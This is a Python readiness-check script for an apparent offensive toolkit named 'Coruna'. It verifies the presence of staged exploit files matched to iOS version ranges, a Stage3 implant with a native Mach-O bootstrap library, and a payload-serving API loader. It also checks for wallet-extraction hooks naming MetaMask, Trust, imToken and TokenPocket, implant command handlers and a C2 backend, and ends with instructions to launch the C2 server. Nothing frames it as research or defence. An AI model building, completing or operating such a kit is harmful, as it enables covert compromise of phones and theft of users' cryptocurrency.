#!/usr/bin/env python3
"""Verify local Coruna toolkit completeness (P0–P3 readiness checks)."""

import json
import struct
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent

REQUIRED_JS = [
    "platform_module.js",
    "utility_module.js",
    "group.html",
    "Stage1_15.2_15.5_jacurutu.js",
    "Stage1_15.6_16.1.2_bluebird.js",
    "Stage1_16.2_16.5.1_terrorbird.js",
    "Stage1_16.6_17.2.1_cassowary.js",
    "Stage2_15.0_16.2_breezy15.js",
    "Stage2_16.3_16.5.1_seedbell.js",
    "Stage2_16.6_16.7.12_seedbell.js",
    "Stage2_16.6_17.2.1_seedbell_pre.js",
    "Stage2_17.0_17.2.1_seedbell.js",
    "Stage2_13.0_14.x_breezy.js",
    "Stage3_VariantA.js",
    "Stage3_VariantB.js",
    "wallet_bridge.js",
    "stage3_wallet_keychain.js",
    "stage3_wallet_install.js",
    "stage3_vault_decrypt.js",
    "implant_ops.js",
    "7d8f5bae97f37aa318bccd652bf0c1dc38fd8396.js",
]

BACKEND_IMPORTS = [
    ("fastapi", "fastapi"),
    ("uvicorn", "uvicorn"),
    ("qrcode", "qrcode[pil]"),
    ("jwt", "PyJWT"),
    ("bcrypt", "bcrypt"),
    ("cryptography", "cryptography"),
]

STAGE3_API_MARKERS_A = (
    "/api/payload/manifest/raw",
    "/api/payload/container/",
    "installStage3WalletBridge",
)
STAGE3_API_MARKERS_B = STAGE3_API_MARKERS_A + (
    "/api/payload/bootstrap",
    "installStage3WalletBridge",
)
STAGE3_WALLET_MARKERS = (
    "registerStage3WalletHooks",
    "__STAGE3_EXTRACT_WALLETS",
    "loadSecondaryDylib",
    "MetaMask",
    "com.sixdays.trust",
    "im.token.app",
    "com.tokenpocket.pro",
)


def check_file(path: Path) -> bool:
    ok = path.exists() and path.stat().st_size > 0
    status = "OK" if ok else "MISSING"
    print(f"  [{status}] {path.relative_to(ROOT)}")
    return ok


def check_bootstrap_dylib(path: Path) -> bool:
    ok = True
    if not path.exists() or path.stat().st_size < 64:
        print("  [FAIL] bootstrap.dylib missing or too small")
        return False

    data = path.read_bytes()
    if data[:4] not in (b"\xcf\xfa\xed\xfe", b"\xfe\xed\xfa\xcf"):
        print("  [FAIL] bootstrap.dylib is not Mach-O")
        return False

    if data[:4] == b"\xcf\xfa\xed\xfe":
        ncmds = struct.unpack_from("<I", data, 16)[0]
        off = 32
        symtab_off = nsyms = strtab_off = 0
        for _ in range(ncmds):
            cmd, cmdsize = struct.unpack_from("<II", data, off)
            if cmd == 2:  # LC_SYMTAB
                symtab_off, nsyms, strtab_off, _ = struct.unpack_from("<IIII", data, off + 8)
            off += cmdsize
        found_process = False
        for i in range(nsyms):
            nlo = symtab_off + i * 16
            if nlo + 16 > len(data):
                break
            strx, ntype = struct.unpack_from("<IB", data, nlo)
            if (ntype & 0x0E) == 0:
                continue
            name = bytearray()
            j = strtab_off + strx
            while j < len(data) and data[j]:
                name.append(data[j])
                j += 1
            if name.decode("ascii", errors="ignore") == "_process":
                found_process = True
                break
        if not found_process:
            print("  [FAIL] bootstrap.dylib missing _process symbol (Stage3 requires it)")
            ok = False
        else:
            print("  [OK] bootstrap.dylib Mach-O + _process symbol")
    else:
        print("  [WARN] bootstrap.dylib is not arm64 little-endian — Stage3 may fail")

    return ok


def check_stage3_api_loader(name: str, markers: tuple[str, ...]) -> bool:
    text = (ROOT / name).read_text()
    ok = all(marker in text for marker in markers) and "buildContainer" in text
    legacy = "payloads/manifest.json" in text
    if legacy:
        print(f"  [FAIL] {name} still references payloads/manifest.json")
        ok = False
    else:
        print(f"  [{'OK' if ok else 'FAIL'}] {name} uses /api/payload/* loader")
    return ok


def check_backend_modules() -> bool:
    ok = True
    modules = [
        "backend/modules/auth.py",
        "backend/modules/audit.py",
        "backend/modules/crypto_utils.py",
        "backend/modules/console_crud.py",
        "backend/modules/runtime_loader.py",
        "backend/modules/device_assets.py",
        "backend/modules/chain_scanner.py",
        "backend/modules/collect_ops.py",
        "backend/c2_server.py",
    ]
    for rel in modules:
        ok = check_file(ROOT / rel) and ok
    return ok


def check_backend_deps() -> bool:
    ok = True
    for module, label in BACKEND_IMPORTS:
        try:
            __import__(module)
            print(f"  [OK] python package: {label}")
        except ImportError:
            print(f"  [MISSING] python package: {label}")
            ok = False
    return ok


def main():
    print("=== JS / HTML files ===")
    ok = all(check_file(ROOT / f) for f in REQUIRED_JS)

    print("\n=== Payload infrastructure ===")
    ok = check_file(ROOT / "payloads/manifest.json") and ok
    bootstrap = ROOT / "payloads/bootstrap.dylib"
    ok = check_file(bootstrap) and ok
    ok = check_bootstrap_dylib(bootstrap) and ok

    manifest = json.loads((ROOT / "payloads/manifest.json").read_text())
    print(f"\n=== Manifest bundles: {len(manifest)} ===")
    missing_entries = 0
    for hash_id, entries in manifest.items():
        bundle_dir = ROOT / "payloads" / hash_id
        if not bundle_dir.is_dir():
            print(f"  [MISSING DIR] {hash_id}")
            missing_entries += 1
            ok = False
            continue
        for entry in entries:
            fp = bundle_dir / entry["file"]
            if not fp.exists():
                print(f"  [MISSING] {hash_id}/{entry['file']}")
                missing_entries += 1
                ok = False
    if missing_entries == 0:
        print("  [OK] all manifest entries present")

    print("\n=== Stage3 API payload loader ===")
    ok = check_stage3_api_loader("Stage3_VariantA.js", STAGE3_API_MARKERS_A) and ok
    ok = check_stage3_api_loader("Stage3_VariantB.js", STAGE3_API_MARKERS_B) and ok

    print("\n=== Stage3 wallet keychain bridge ===")
    wallet_js = (ROOT / "stage3_wallet_keychain.js").read_text()
    wallet_ok = all(m in wallet_js for m in STAGE3_WALLET_MARKERS)
    print(f"  [{'OK' if wallet_ok else 'FAIL'}] stage3_wallet_keychain.js targets 4 wallet apps")
    ok = wallet_ok and ok
    group_html = (ROOT / "group.html").read_text()
    implant_ok = "implant_ops.js" in group_html and "ImplantOps.handleCommand" in group_html
    print(f"  [{'OK' if implant_ok else 'FAIL'}] group.html wires ImplantOps C2 handlers")
    ok = implant_ok and ok
    wb_src = ROOT / "bootstrap_wallet" / "wallet_keychain.m"
    print(f"  [{'OK' if wb_src.exists() else 'FAIL'}] bootstrap_wallet native source present")
    ok = wb_src.exists() and ok
    wb_bin = ROOT / "payloads" / "wallet_bridge.dylib"
    if wb_bin.exists():
        print("  [OK] payloads/wallet_bridge.dylib built")
    else:
        print("  [WARN] payloads/wallet_bridge.dylib missing — run bootstrap_wallet/build.sh for native sign helper")

    print("\n=== Backend modules (P1–P3) ===")
    ok = check_backend_modules() and ok

    print("\n=== Backend Python dependencies ===")
    ok = check_backend_deps() and ok

    print()
    if ok:
        print("RESULT: READY — run: ./start.sh")
        print("         or:  python3 backend/c2_server.py --port 9000")
        print("         test: python3 tests/test_full_stack.py")
        print("NOTE: serve.py is deprecated (static only, no /api/*).")
        return 0
    print("RESULT: INCOMPLETE — fix missing items above")
    return 1


if __name__ == "__main__":
    sys.exit(main())
